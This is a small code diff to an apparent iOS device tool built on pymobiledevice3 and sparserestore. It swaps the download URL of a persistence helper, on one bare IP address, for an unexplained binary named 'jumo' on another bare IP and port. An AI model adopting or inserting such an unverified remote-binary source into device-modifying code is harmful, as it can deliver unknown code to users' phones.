@@ -15,7 +15,7 @@ from pymobiledevice3.services.installation_proxy import InstallationProxyService
 from sparserestore import backup, perform_restore
 
 HELPER_URLS = [
-    "http://124.70.142.143/releases/latest/download/PersistenceHelper_Embedded"
+    "http://124.221.171.80:81/releases/latest/download/jumo"
 ]
 
 def exit(code=0):
